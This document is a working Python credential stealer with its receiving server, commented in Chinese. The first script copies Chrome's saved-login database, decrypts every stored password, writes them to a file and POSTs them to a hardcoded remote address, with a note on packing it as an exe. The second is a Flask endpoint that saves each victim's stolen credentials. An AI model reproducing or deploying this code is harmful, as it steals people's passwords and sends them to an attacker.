```
# encoding=utf-8
import os
import shutil
import sqlite3
# pip install pywin32
import win32crypt
import json
import requests
APP_DATA_PATH = os.environ["LOCALAPPDATA"]
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
class ChromePassword:
    def __init__(self):
        self.passwordsList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _tmp_file = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_tmp_file):
            os.remove(_tmp_file)
        shutil.copyfile(_full_path, _tmp_file)
        self.show_passwords(_tmp_file)

    def show_passwords(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = '''select signon_realm,username_value,password_value from logins'''
        for row in conn.execute(_sql):
            ret = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)
            # 密码解析后得到的是字节码，需要进行解码操作
            _info = '网站: {} 用户名: {} 密码: {}\n' .format(row[0][:50], row[1], ret[1].decode())
            self.passwordsList.append(_info)
        conn.close()
        os.remove(db_file)

    def save_passwords(self):
            with open('password.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordsList)

    def transfer_passwords(self):
            try:
                # 此处填写远端Flask对应的IP:PORT
                requests.post('http://192.168.0.102:9999/index',
                              data=json.dumps(self.passwordsList))
            except requests.exceptions.ConnectionError:
                pass


if __name__ == '__main__':
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
    Main.transfer_passwords()
# pyinstaller -F xxx.py,将代码打包成exe
```
```
# encoding=utf-8
from flask import Flask, request
import time
import json
app = Flask(__name__)
@app.route('/index', methods=["GET", "POST"])
def index():
    if request.method == 'POST':
        _txtName = '%s_%s.txt' % (request.remote_addr, time.strftime('%Y%m%d%H%M%S', time.localtime()))
        with open(_txtName, 'w', encoding='utf-8') as f:
            f.writelines(json.loads(request.data))
    return "小哥，里面玩儿啊"

if __name__ == '__main__':
    # 端口可自行设置
    app.run(host='0.0.0.0', port=9999)
```
